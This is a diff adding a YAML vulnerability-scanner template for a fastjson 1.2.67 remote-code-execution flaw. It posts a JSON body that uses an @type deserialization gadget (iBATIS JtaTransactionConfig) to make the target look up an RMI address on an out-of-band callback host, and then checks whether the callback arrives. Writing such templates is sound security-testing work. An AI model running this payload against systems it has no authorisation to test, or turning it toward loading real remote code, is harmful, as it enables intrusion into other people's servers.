@@ -1,0 +1,21 @@
+name: fastjson-1.2.67.rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
+           "properties":{
+              "@type":"java.util.Properties",
+              "UserTransaction":"rmi://{{reverseURL}}/Exploit"
+           }
+        }
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0() 
